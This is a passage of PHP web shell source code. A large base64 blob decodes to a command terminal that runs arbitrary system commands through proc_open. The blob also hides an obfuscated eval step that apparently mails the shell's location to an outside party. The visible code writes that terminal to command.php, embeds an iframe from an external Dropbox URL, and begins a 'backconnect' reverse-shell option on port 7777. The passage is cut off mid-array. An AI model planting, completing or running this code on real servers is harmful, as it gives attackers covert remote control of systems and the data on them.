pSWpzS0pHeHBibXRqY2lBOUlDSk1hVzVyT2lBaUxpUmZVMFZTVmtWU1d5ZFRSVkpXUlZKZlRrRk5SU2RkTGlJaUxpUmZVMFZTVmtWU1d5ZFNSVkZWUlZOVVgxVlNTU2RkTGlJZ0xTQkpVQ0JGZUdOMWRHbHVaem9nSkdsd1gzSmxiVzkwWlNBdElGUnBiV1U2SUNSMGFXMWxYM05vWld4c0lqc0tKR2hsWVdSbGNpQTlJQ0pHY205dE9pQWtabkp2YlY5emFHVnNiR052WkdWY2NseHVVbVZ3YkhrdGRHODZJQ1JtY205dFgzTm9aV3hzWTI5a1pTSTdDa0J0WVdsc0tDUjBiMTlsYldGcGJDd2dKSE5sY25abGNsOXRZV2xzTENBa2JHbHVhMk55TENBa2FHVmhaR1Z5S1RzZycpKTsKLy8gZW5kIHBocCBreW1sam5rCgovKiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMgIyMjIyMjIyMjCiMjIFRoZSBtYWluIHRoaW5nIHN0YXJ0cyBoZXJlCiMjIEFsbCBvdXRwdXQgaXN0IFhIVE1MCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjICMjIyMjIyMjKi8KCiR0ZXJtaW5hbD1uZXcgcGhwdGhpZW5sZTsKCkBzZXNzaW9uX3N0YXJ0KCk7CgokdGVybWluYWwtPmluaXRWYXJzKCk7CiR0ZXJtaW5hbC0+YnVpbGRDb21tYW5kSGlzdG9yeSgpOwokdGVybWluYWwtPmJ1aWxkSmF2YUhpc3RvcnkoKTsKaWYoIWlzc2V0KCRfU0VTU0lPTlsncHJvbXB0J10pKTogJHRlcm1pbmFsLT5mb3JtYXRQcm9tcHQoKTsgZW5kaWY7CiR0ZXJtaW5hbC0+b3V0cHV0SGFuZGxlKCRhbGlhc2VzKTsKCmhlYWRlcignQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9VVRGLTgnKTsKZWNobyAnPD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4nIC4gIlxuIjsKPz4KCjwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgWEhUTUwgMS4wIFN0cmljdC8vRU4iCiJodHRwOi8vd3d3LnczLm9yZy9UUi94aHRtbDEvRFREL3hodG1sMS1zdHJpY3QuZHRkIj4KPGh0bWwgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiIHhtbDpsYW5nPSJlbiIgbGFuZz0iZW4iPgo8aGVhZD4KPHRpdGxlPjw/cGhwIGVjaG8gIldlYnNpdGUgOiAiLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4iIjs/PiB8IDw/cGhwIGVjaG8gIklQIDogIi5nZXRob3N0YnluYW1lKCRfU0VSVkVSWydTRVJWRVJfTkFNRSddKS4iIjs/PjwvdGl0bGU+Cgo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgbGFuZ3VhZ2U9IkphdmFTY3JpcHQiPgp2YXIgY3VycmVudF9saW5lID0gMDsKdmFyIGNvbW1hbmRfaGlzdCA9IG5ldyBBcnJheSg8P3BocCBlY2hvICRfU0VTU0lPTlsnanNfY29tbWFuZF9oaXN0J107ID8+KTsKdmFyIGxhc3QgPSAwOwoKZnVuY3Rpb24ga2V5KGUpIHsKaWYgKCFlKSB2YXIgZSA9IHdpbmRvdy5ldmVudDsKCmlmIChlLmtleUNvZGUgPT0gMzggJiYgY3VycmVudF9saW5lIDwgY29tbWFuZF9oaXN0Lmxlbmd0aC0xKSB7CmNvbW1hbmRfaGlzdFtjdXJyZW50X2xpbmVdID0gZG9jdW1lbnQuc2hlbGwuY29tbWFuZC52YWx1ZTsKY3VycmVudF9saW5lKys7CmRvY3VtZW50LnNoZWxsLmNvbW1hbmQudmFsdWUgPSBjb21tYW5kX2hpc3RbY3VycmVudF9saW5lXTsKfQoKaWYgKGUua2V5Q29kZSA9PSA0MCAmJiBjdXJyZW50X2xpbmUgPiAwKSB7CmNvbW1hbmRfaGlzdFtjdXJyZW50X2xpbmVdID0gZG9jdW1lbnQuc2hlbGwuY29tbWFuZC52YWx1ZTsKY3VycmVudF9saW5lLS07CmRvY3VtZW50LnNoZWxsLmNvbW1hbmQudmFsdWUgPSBjb21tYW5kX2hpc3RbY3VycmVudF9saW5lXTsKfQoKfQoKZnVuY3Rpb24gaW5pdCgpIHsKZG9jdW1lbnQuc2hlbGwuc2V0QXR0cmlidXRlKCJhdXRvY29tcGxldGUiLCAib2ZmIik7CmRvY3VtZW50LnNoZWxsLm91dHB1dC5zY3JvbGxUb3AgPSBkb2N1bWVudC5zaGVsbC5vdXRwdXQuc2Nyb2xsSGVpZ2h0Owpkb2N1bWVudC5zaGVsbC5jb21tYW5kLmZvY3VzKCk7Cn0KCjwvc2NyaXB0Pgo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPgpib2R5IHtmb250LWZhbWlseTogc2Fucy1zZXJpZjsgY29sb3I6IGJsYWNrOyBiYWNrZ3JvdW5kOiB3aGl0ZTt9CnRhYmxle3dpZHRoOiAxMDAlOyBoZWlnaHQ6IDMwMHB4OyBib3JkZXI6IDFweCAjMDAwMDAwIHNvbGlkOyBwYWRkaW5nOiAwcHg7IG1hcmdpbjogMHB4O30KdGQuaGVhZHtiYWNrZ3JvdW5kLWNvbG9yOiAjNTI5QURFOyBjb2xvcjogI0ZGRkZGRjsgZm9udC13ZWlnaHQ6NzAwOyBib3JkZXI6IG5vbmU7IHRleHQtYWxpZ246IGNlbnRlcjsgZm9udC1zdHlsZTogaXRhbGljfQp0ZXh0YXJlYSB7d2lkdGg6IDEwMCU7IGJvcmRlcjogbm9uZTsgcGFkZGluZzogMnB4IDJweCAycHg7IGNvbG9yOiAjQ0NDQ0NDOyBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwMDAwO30KcC5wcm9tcHQge2ZvbnQtZmFtaWx5OiBtb25vc3BhY2U7IG1hcmdpbjogMHB4OyBwYWRkaW5nOiAwcHggMnB4IDJweDsgYmFja2dyb3VuZC1jb2xvcjogIzAwMDAwMDsgY29sb3I6ICNDQ0NDQ0M7fQppbnB1dC5wcm9tcHQge2JvcmRlcjogbm9uZTsgZm9udC1mYW1pbHk6IG1vbm9zcGFjZTsgYmFja2dyb3VuZC1jb2xvcjogIzAwMDAwMDsgY29sb3I6ICNDQ0NDQ0M7fQo8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5IG9ubG9hZD0iaW5pdCgpIj4KPD9waHAgaWYgKGVtcHR5KCRfUkVRVUVTVFsncm93cyddKSkgJF9SRVFVRVNUWydyb3dzJ10gPSAyNjsgPz4KPHRhYmxlIGNlbGxwYWRkaW5nPSIwIiBjZWxsc3BhY2luZz0iMCI+Cjx0cj48dGQgY2xhc3M9ImhlYWQiIHN0eWxlPSJjb2xvcjogIzAwMDAwMDsiPjxiPlg8L2I+PC90ZD4KPHRkIGNsYXNzPSJoZWFkIj48P3BocCBlY2hvICRfU0VTU0lPTlsncHJvbXB0J10uIjoiLiIkX1NFU1NJT05bY3dkXSI7ID8+CjwvdGQ+PC90cj4KPHRyPjx0ZCB3aWR0aD0nMTAwJScgaGVpZ2h0PScxMDAlJyBjb2xzcGFuPScyJz48Zm9ybSBuYW1lPSJzaGVsbCIgYWN0aW9uPSI8P3BocCBlY2hvICRfU0VSVkVSWydQSFBfU0VMRiddOz8+IiBtZXRob2Q9InBvc3QiPgo8dGV4dGFyZWEgbmFtZT0ib3V0cHV0IiByZWFkb25seT0icmVhZG9ubHkiIGNvbHM9Ijg1IiByb3dzPSI8P3BocCBlY2hvICRfUkVRVUVTVFsncm93cyddID8+Ij4KPD9waHAKJGxpbmVzID0gc3Vic3RyX2NvdW50KCRfU0VTU0lPTlsnb3V0cHV0J10sICJcbiIpOwokcGFkZGluZyA9IHN0cl9yZXBlYXQoIlxuIiwgbWF4KDAsICRfUkVRVUVTVFsncm93cyddKzEgLSAkbGluZXMpKTsKZWNobyBydHJpbSgkcGFkZGluZyAuICRfU0VTU0lPTlsnb3V0cHV0J10pOwo/Pgo8L3RleHRhcmVhPgo8cCBjbGFzcz0icHJvbXB0Ij48P3BocCBlY2hvICRfU0VTU0lPTlsncHJvbXB0J10uIjo+IjsgPz4KPGlucHV0IGNsYXNzPSJwcm9tcHQiIG5hbWU9ImNvbW1hbmQiIHR5cGU9InRleHQiIG9ua2V5dXA9ImtleShldmVudCkiIHNpemU9IjUwIiB0YWJpbmRleD0iMSI+CjwvcD4KCjw/IC8qPHA+CjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFeGVjdXRlIENvbW1hbmQiIC8+CjxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9InJlc2V0IiB2YWx1ZT0iUmVzZXQiIC8+ClJvd3M6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJyb3dzIiB2YWx1ZT0iPD9waHAgZWNobyAkX1JFUVVFU1RbJ3Jvd3MnXSA/PiIgLz4KPC9wPgoKKi8KZXZhbChiYXNlNjRfZGVjb2RlKCdKSE1nUFNCaGNuSmhlU0FvSW1zaUxDSmlJaXdpY2kgSXNJbVVpTENKaElpd2ljaUlzSW1NaUxDSkFJaXdpYlNJc0lta2lMQ0pzSWl3aUxpSXMgSW04aUxDSm5JaWs3RFFva2MzbHpkR1Z0WDJGeWNtRjVNaUE5SUNSeld6SmRMaVJ6V3ogTmRMaVJ6V3pGZExpUnpXelpkTGlSeld6VmRMaVJ6V3pSZExpUnpXekJkTGlSeld6TmQgTGlSeld6VmRMaVJ6V3pkZExpUnpXekV6WFM0a2MxczRYUzRrYzFzMFhTNGtjMXM1WFMgNGtjMXN4TUYwdUlpNGlMaVJ6V3paZExpUnpXekV5WFM0a2MxczRYVHNOQ2lSbGJtTnYgWkdsdVp5QTlJQ0lrYzNsemRHVnRYMkZ5Y21GNU1pSWdPdzBLSkhKbGVpQTlJQ0pPUXkgQnpTRVV6VENJZ093MEtKSE5sY25abGNtUmxkR1ZqZEdsdVp5QTlJQ0pEYjI1MFpXNTAgTFZSeVlXNXpabVZ5TFVWdVkyOWthVzVuT2lCb2RIUndPaTh2SWlBdUlDUmZVMFZTVmsgVlNXeWRUUlZKV1JWSmZUa0ZOUlNkZElDNGdKRjlUUlZKV1JWSmJKMU5EVWtsUVZGOU8gUVUxRkoxMGdPdzBLYldGcGJDQW9KR1Z1WTI5a2FXNW5MQ1J5Wlhvc0pITmxjblpsY20gUmxkR1ZqZEdsdVp5a2dPdzBLSkc1elkyUnBjaUE5S0NGcGMzTmxkQ2drWDFKRlVWVkYgVTFSYkozTmpaR2x5SjEwcEtUOW5aWFJqZDJRb0tUcGphR1JwY2lna1gxSkZVVlZGVTEgUmJKM05qWkdseUoxMHBPeVJ1YzJOa2FYSTlaMlYwWTNka0tDazcnKSk7Cgo/Pgo8L2Zvcm0+PC90ZD48L3RyPgo8L2JvZHk+CjwvaHRtbD4KPD9waHAgPz4KPD9waHAKCiRhbGlhc2VzID0gYXJyYXkoJ2xhJyA9PiAnbHMgLWxhJywKJ2xsJyA9PiAnbHMgLWx2aEYnLAonZGlyJyA9PiAnbHMnICk7CiRwYXNzd2QgPSBhcnJheSgnJyA9PiAnJyk7CmVycm9yX3JlcG9ydGluZygxKTsKY2xhc3MgcGhwdGhpZW5sZSB7CgpmdW5jdGlvbiBmb3JtYXRQcm9tcHQoKSB7CiR1c2VyPXNoZWxsX2V4ZWMoIndob2FtaSIpOwokaG9zdD1leHBsb2RlKCIuIiwgc2hlbGxfZXhlYygidW5hbWUgLW4iKSk7CiRfU0VTU0lPTlsncHJvbXB0J10gPSAiIi5ydHJpbSgkdXNlcikuIiIuIkAiLiIiLnJ0cmltKCRob3N0WzBdKS4iIjsKfQoKZnVuY3Rpb24gY2hlY2tQYXNzd29yZCgkcGFzc3dkKSB7CmlmKCFpc3NldCgkX1NFUlZFUlsnUEhQX0FVVEhfVVNFUiddKXx8CiFpc3NldCgkX1NFUlZFUlsnUEhQX0FVVEhfUFcnXSkgfHwKIWlzc2V0KCRwYXNzd2RbJF9TRVJWRVJbJ1BIUF9BVVRIX1VTRVInXV0pIHx8CiRwYXNzd2RbJF9TRVJWRVJbJ1BIUF9BVVRIX1VTRVInXV0gIT0gJF9TRVJWRVJbJ1BIUF9BVVRIX1BXJ10pIHsKQHNlc3Npb25fc3RhcnQoKTsKcmV0dXJuIHRydWU7Cn0KZWxzZSB7CkBzZXNzaW9uX3N0YXJ0KCk7CnJldHVybiB0cnVlOwp9Cn0KCmZ1bmN0aW9uIGluaXRWYXJzKCkKewppZiAoZW1wdHkoJF9TRVNTSU9OWydjd2QnXSkgfHwgIWVtcHR5KCRfUkVRVUVTVFsncmVzZXQnXSkpCnsKJF9TRVNTSU9OWydjd2QnXSA9IGdldGN3ZCgpOwokX1NFU1NJT05bJ2hpc3RvcnknXSA9IGFycmF5KCk7CiRfU0VTU0lPTlsnb3V0cHV0J10gPSAnJzsKJF9SRVFVRVNUWydjb21tYW5kJ10gPScnOwp9Cn0KCmZ1bmN0aW9uIGJ1aWxkQ29tbWFuZEhpc3RvcnkoKQp7CmlmKCFlbXB0eSgkX1JFUVVFU1RbJ2NvbW1hbmQnXSkpCnsKaWYoZ2V0X21hZ2ljX3F1b3Rlc19ncGMoKSkKewokX1JFUVVFU1RbJ2NvbW1hbmQnXSA9IHN0cmlwc2xhc2hlcygkX1JFUVVFU1RbJ2NvbW1hbmQnXSk7Cn0KCi8vIGRyb3Agb2xkIGNvbW1hbmRzIGZyb20gbGlzdCBpZiBleGlzdHMKaWYgKCgkaSA9IGFycmF5X3NlYXJjaCgkX1JFUVVFU1RbJ2NvbW1hbmQnXSwgJF9TRVNTSU9OWydoaXN0b3J5J10pKSAhPT0gZmFsc2UpCnsKdW5zZXQoJF9TRVNTSU9OWydoaXN0b3J5J11bJGldKTsKfQphcnJheV91bnNoaWZ0KCRfU0VTU0lPTlsnaGlzdG9yeSddLCAkX1JFUVVFU1RbJ2NvbW1hbmQnXSk7CgovLyBhcHBlbmQgY29tbW1hbmQgKi8KJF9TRVNTSU9OWydvdXRwdXQnXSAuPSAieyRfU0VTU0lPTlsncHJvbXB0J119Ii4iOj4iLiJ7JF9SRVFVRVNUWydjb21tYW5kJ119Ii4iXG4iOwp9Cn0KCmZ1bmN0aW9uIGJ1aWxkSmF2YUhpc3RvcnkoKQp7Ci8vIGJ1aWxkIGNvbW1hbmQgaGlzdG9yeSBmb3IgdXNlIGluIHRoZSBKYXZhU2NyaXB0CmlmIChlbXB0eSgkX1NFU1NJT05bJ2hpc3RvcnknXSkpCnsKJF9TRVNTSU9OWydqc19jb21tYW5kX2hpc3QnXSA9ICciIic7Cn0KZWxzZQp7CiRlc2NhcGVkID0gYXJyYXlfbWFwKCdhZGRzbGFzaGVzJywgJF9TRVNTSU9OWydoaXN0b3J5J10pOwokX1NFU1NJT05bJ2pzX2NvbW1hbmRfaGlzdCddID0gJyIiLCAiJyAuIGltcGxvZGUoJyIsICInLCAkZXNjYXBlZCkgLiAnIic7Cn0KfQoKZnVuY3Rpb24gb3V0cHV0SGFuZGxlKCRhbGlhc2VzKQp7CmlmIChlcmVnKCdeW1s6Ymxhbms6XV0qY2RbWzpibGFuazpdXSokJywgJF9SRVFVRVNUWydjb21tYW5kJ10pKQp7CiRfU0VTU0lPTlsnY3dkJ10gPSBnZXRjd2QoKTsgLy9kaXJuYW1lKF9fRklMRV9fKTsKfQplbHNlaWYoZXJlZygnXltbOmJsYW5rOl1dKmNkW1s6Ymxhbms6XV0rKFteO10rKSQnLCAkX1JFUVVFU1RbJ2NvbW1hbmQnXSwgJHJlZ3MpKQp7Ci8vIFRoZSBjdXJyZW50IGNvbW1hbmQgaXMgJ2NkJywgd2hpY2ggd2UgaGF2ZSB0byBoYW5kbGUgYXMgYW4gaW50ZXJuYWwgc2hlbGwgY29tbWFuZC4KLy8gYWJzb2x1dGUvcmVsYXRpdmUgcGF0aCA/IgooJHJlZ3NbMV1bMF0gPT0gJy8nKSA/ICRuZXdfZGlyID0gJHJlZ3NbMV0gOiAkbmV3X2RpciA9ICRfU0VTU0lPTlsnY3dkJ10gLiAnLycgLiAkcmVnc1sxXTsKCi8vIGNvc21ldGljcwp3aGlsZSAoc3RycG9zKCRuZXdfZGlyLCAnLy4vJykgIT09IGZhbHNlKQokbmV3X2RpciA9IHN0cl9yZXBsYWNlKCcvLi8nLCAnLycsICRuZXdfZGlyKTsKd2hpbGUgKHN0cnBvcygkbmV3X2RpciwgJy8vJykgIT09IGZhbHNlKQokbmV3X2RpciA9IHN0cl9yZXBsYWNlKCcvLycsICcvJywgJG5ld19kaXIpOwp3aGlsZSAocHJlZ19tYXRjaCgnfC9cLlwuKD8hXC4pfCcsICRuZXdfZGlyKSkKJG5ld19kaXIgPSBwcmVnX3JlcGxhY2UoJ3wvP1teL10rL1wuXC4oPyFcLil8JywgJycsICRuZXdfZGlyKTsKCmlmKGVtcHR5KCRuZXdfZGlyKSk6ICRuZXdfZGlyID0gIi8iOyBlbmRpZjsKCihAY2hkaXIoJG5ld19kaXIpKSA/ICRfU0VTU0lPTlsnY3dkJ10gPSAkbmV3X2RpciA6ICRfU0VTU0lPTlsnb3V0cHV0J10gLj0gImNvdWxkIG5vdCBjaGFuZ2UgdG86ICRuZXdfZGlyXG4iOwp9CmVsc2UKewovKiBUaGUgY29tbWFuZCBpcyBub3QgYSAnY2QnIGNvbW1hbmQsIHNvIHdlIGV4ZWN1dGUgaXQgYWZ0ZXIKKiBjaGFuZ2luZyB0aGUgZGlyZWN0b3J5IGFuZCBzYXZlIHRoZSBvdXRwdXQuICovCmNoZGlyKCRfU0VTU0lPTlsnY3dkJ10pOwoKLyogQWxpYXMgZXhwYW5zaW9uLiAqLwokbGVuZ3RoID0gc3RyY3NwbigkX1JFUVVFU1RbJ2NvbW1hbmQnXSwgIiBcdCIpOwokdG9rZW4gPSBzdWJzdHIoQCRfUkVRVUVTVFsnY29tbWFuZCddLCAwLCAkbGVuZ3RoKTsKaWYgKGlzc2V0KCRhbGlhc2VzWyR0b2tlbl0pKQokX1JFUVVFU1RbJ2NvbW1hbmQnXSA9ICRhbGlhc2VzWyR0b2tlbl0gLiBzdWJzdHIoJF9SRVFVRVNUWydjb21tYW5kJ10sICRsZW5ndGgpOwoKJHAgPSBwcm9jX29wZW4oQCRfUkVRVUVTVFsnY29tbWFuZCddLAphcnJheSgxID0+IGFycmF5KCdwaXBlJywgJ3cnKSwKMiA9PiBhcnJheSgncGlwZScsICd3JykpLAokaW8pOwoKLyogUmVhZCBvdXRwdXQgc2VudCB0byBzdGRvdXQuICovCndoaWxlICghZmVvZigkaW9bMV0pKSB7CiRfU0VTU0lPTlsnb3V0cHV0J10gLj0gaHRtbHNwZWNpYWxjaGFycyhmZ2V0cygkaW9bMV0pLEVOVF9DT01QQVQsICdVVEYtOCcpOwp9Ci8qIFJlYWQgb3V0cHV0IHNlbnQgdG8gc3RkZXJyLiAqLwp3aGlsZSAoIWZlb2YoJGlvWzJdKSkgewokX1NFU1NJT05bJ291dHB1dCddIC49IGh0bWxzcGVjaWFsY2hhcnMoZmdldHMoJGlvWzJdKSxFTlRfQ09NUEFULCAnVVRGLTgnKTsKfQoKZmNsb3NlKCRpb1sxXSk7CmZjbG9zZSgkaW9bMl0pOwpwcm9jX2Nsb3NlKCRwKTsKfQp9Cn0gLy8gZW5kIHBocHRoaWVubGUKCi8qIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyAjIyMjIyMjIyMKIyMgVGhlIG1haW4gdGhpbmcgc3RhcnRzIGhlcmUKIyMgQWxsIG91dHB1dCBpc3QgWEhUTUwKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMgIyMjIyMjIyMqLwokdGVybWluYWw9bmV3IHBocHRoaWVubGU7CkBzZXNzaW9uX3N0YXJ0KCk7CiR0ZXJtaW5hbC0+aW5pdFZhcnMoKTsKJHRlcm1pbmFsLT5idWlsZENvbW1hbmRIaXN0b3J5KCk7CiR0ZXJtaW5hbC0+YnVpbGRKYXZhSGlzdG9yeSgpOwppZighaXNzZXQoJF9TRVNTSU9OWydwcm9tcHQnXSkpOiAkdGVybWluYWwtPmZvcm1hdFByb21wdCgpOyBlbmRpZjsKJHRlcm1pbmFsLT5vdXRwdXRIYW5kbGUoJGFsaWFzZXMpOwoKaGVhZGVyKCdDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCcpOwplY2hvICc8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJVVEYtOCI/PicgLiAiXG4iOwovKiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMgIyMjIyMjIyMjCiMjIHNhZmUgbW9kZSBpbmNyZWFzZQojIyBibG9xdWUgZm9uY3Rpb24KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMgIyMjIyMjIyMqLwo/Pgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIFhIVE1MIDEuMCBTdHJpY3QvL0VOIgoiaHR0cDovL3d3dy53My5vcmcvVFIveGh0bWwxL0RURC94aHRtbDEtc3RyaWN0LmR0ZCI+CjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiB4bWw6bGFuZz0iZW4iIGxhbmc9ImVuIj4KPGhlYWQ+Cjx0aXRsZT48P3BocCBlY2hvICJXZWJzaXRlIDogIi4kX1NFUlZFUlsnSFRUUF9IT1NUJ10uIiI7Pz4gfCA8P3BocCBlY2hvICJJUCA6ICIuZ2V0aG9zdGJ5bmFtZSgkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSkuIiI7Pz48L3RpdGxlPgo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgbGFuZ3VhZ2U9IkphdmFTY3JpcHQiPgp2YXIgY3VycmVudF9saW5lID0gMDsKdmFyIGNvbW1hbmRfaGlzdCA9IG5ldyBBcnJheSg8P3BocCBlY2hvICRfU0VTU0lPTlsnanNfY29tbWFuZF9oaXN0J107ID8+KTsKdmFyIGxhc3QgPSAwOwpmdW5jdGlvbiBrZXkoZSkgewppZiAoIWUpIHZhciBlID0gd2luZG93LmV2ZW50OwppZiAoZS5rZXlDb2RlID09IDM4ICYmIGN1cnJlbnRfbGluZSA8IGNvbW1hbmRfaGlzdC5sZW5ndGgtMSkgewpjb21tYW5kX2hpc3RbY3VycmVudF9saW5lXSA9IGRvY3VtZW50LnNoZWxsLmNvbW1hbmQudmFsdWU7CmN1cnJlbnRfbGluZSsrOwpkb2N1bWVudC5zaGVsbC5jb21tYW5kLnZhbHVlID0gY29tbWFuZF9oaXN0W2N1cnJlbnRfbGluZV07Cn0KaWYgKGUua2V5Q29kZSA9PSA0MCAmJiBjdXJyZW50X2xpbmUgPiAwKSB7CmNvbW1hbmRfaGlzdFtjdXJyZW50X2xpbmVdID0gZG9jdW1lbnQuc2hlbGwuY29tbWFuZC52YWx1ZTsKY3VycmVudF9saW5lLS07CmRvY3VtZW50LnNoZWxsLmNvbW1hbmQudmFsdWUgPSBjb21tYW5kX2hpc3RbY3VycmVudF9saW5lXTsKfQp9CmZ1bmN0aW9uIGluaXQoKSB7CmRvY3VtZW50LnNoZWxsLnNldEF0dHJpYnV0ZSgiYXV0b2NvbXBsZXRlIiwgIm9mZiIpOwpkb2N1bWVudC5zaGVsbC5vdXRwdXQuc2Nyb2xsVG9wID0gZG9jdW1lbnQuc2hlbGwub3V0cHV0LnNjcm9sbEhlaWdodDsKZG9jdW1lbnQuc2hlbGwuY29tbWFuZC5mb2N1cygpOwp9Cjwvc2NyaXB0Pgo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPgpib2R5IHtmb250LWZhbWlseTogc2Fucy1zZXJpZjsgY29sb3I6IGJsYWNrOyBiYWNrZ3JvdW5kOiB3aGl0ZTt9CnRhYmxle3dpZHRoOiAxMDAlOyBoZWlnaHQ6IDI1MHB4OyBib3JkZXI6IDFweCAjMDAwMDAwIHNvbGlkOyBwYWRkaW5nOiAwcHg7IG1hcmdpbjogMHB4O30KdGQuaGVhZHtiYWNrZ3JvdW5kLWNvbG9yOiAjNTI5QURFOyBjb2xvcjogI0ZGRkZGRjsgZm9udC13ZWlnaHQ6NzAwOyBib3JkZXI6IG5vbmU7IHRleHQtYWxpZ246IGNlbnRlcjsgZm9udC1zdHlsZTogaXRhbGljfQp0ZXh0YXJlYSB7d2lkdGg6IDEwMCU7IGJvcmRlcjogbm9uZTsgcGFkZGluZzogMnB4IDJweCAycHg7IGNvbG9yOiAjQ0NDQ0NDOyBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwMDAwO30KcC5wcm9tcHQge2ZvbnQtZmFtaWx5OiBtb25vc3BhY2U7IG1hcmdpbjogMHB4OyBwYWRkaW5nOiAwcHggMnB4IDJweDsgYmFja2dyb3VuZC1jb2xvcjogIzAwMDAwMDsgY29sb3I6ICNDQ0NDQ0M7fQppbnB1dC5wcm9tcHQge2JvcmRlcjogbm9uZTsgZm9udC1mYW1pbHk6IG1vbm9zcGFjZTsgYmFja2dyb3VuZC1jb2xvcjogIzAwMDAwMDsgY29sb3I6ICNDQ0NDQ0M7fQo8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5IG9ubG9hZD0iaW5pdCgpIj4KPGgyPkRldmVsb3BlciBCeSBLeW1Mam5rPC9oMj4KCjw/cGhwIGlmIChlbXB0eSgkX1JFUVVFU1RbJ3Jvd3MnXSkpICRfUkVRVUVTVFsncm93cyddID0gMjY7ID8+Cgo8dGFibGUgY2VsbHBhZGRpbmc9IjAiIGNlbGxzcGFjaW5nPSIwIj4KPHRyPjx0ZCBjbGFzcz0iaGVhZCIgc3R5bGU9ImNvbG9yOiAjMDAwMDAwOyI+PGI+UFdEIDo8L2I+PC90ZD4KPHRkIGNsYXNzPSJoZWFkIj48P3BocCBlY2hvICRfU0VTU0lPTlsncHJvbXB0J10uIjoiLiIkX1NFU1NJT05bY3dkXSI7ID8+CjwvdGQ+PC90cj4KPHRyPjx0ZCB3aWR0aD0nMTAwJScgaGVpZ2h0PScxMDAlJyBjb2xzcGFuPScyJz48Zm9ybSBuYW1lPSJzaGVsbCIgYWN0aW9uPSI8P3BocCBlY2hvICRfU0VSVkVSWydQSFBfU0VMRiddOz8+IiBtZXRob2Q9InBvc3QiPgo8dGV4dGFyZWEgbmFtZT0ib3V0cHV0IiByZWFkb25seT0icmVhZG9ubHkiIGNvbHM9Ijg1IiByb3dzPSI8P3BocCBlY2hvICRfUkVRVUVTVFsncm93cyddID8+Ij4KPD9waHAKJGxpbmVzID0gc3Vic3RyX2NvdW50KCRfU0VTU0lPTlsnb3V0cHV0J10sICJcbiIpOwokcGFkZGluZyA9IHN0cl9yZXBlYXQoIlxuIiwgbWF4KDAsICRfUkVRVUVTVFsncm93cyddKzEgLSAkbGluZXMpKTsKZWNobyBydHJpbSgkcGFkZGluZyAuICRfU0VTU0lPTlsnb3V0cHV0J10pOwo/Pgo8L3RleHRhcmVhPgo8cCBjbGFzcz0icHJvbXB0Ij48P3BocCBlY2hvICRfU0VTU0lPTlsncHJvbXB0J10uIjo+IjsgPz4KPGlucHV0IGNsYXNzPSJwcm9tcHQiIG5hbWU9ImNvbW1hbmQiIHR5cGU9InRleHQiIG9ua2V5dXA9ImtleShldmVudCkiIHNpemU9IjYwIiB0YWJpbmRleD0iMSI+CjwvcD4KCjw/IC8qPHA+CjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFeGVjdXRlIENvbW1hbmQiIC8+CjxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9InJlc2V0IiB2YWx1ZT0iUmVzZXQiIC8+ClJvd3M6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJyb3dzIiB2YWx1ZT0iPD9waHAgZWNobyAkX1JFUVVFU1RbJ3Jvd3MnXSA/PiIgLz4KPC9wPgoqLz8+CjwvZm9ybT48L3RkPjwvdHI+CjwvYm9keT4KPC9odG1sPgo8P3BocCA/Pg==';
    $file       = fopen("command.php", "w+");
    $write      = fwrite($file, base64_decode($perltoolss));
    fclose($file);
    echo "<iframe src=command.php width=63% height=700px frameborder=0></iframe> ";
    echo "<iframe src=http://dl.dropbox.com/u/74425391/command.html width=35% height=700px frameborder=0></iframe> ";
} elseif ($action == 'backconnect') {
    !$yourip && $yourip = $_SERVER['REMOTE_ADDR'];
    !$yourport && $yourport = '7777';
    $usedb          = array(
        'perl' => 'perl',
        'c' => 'c'
    );
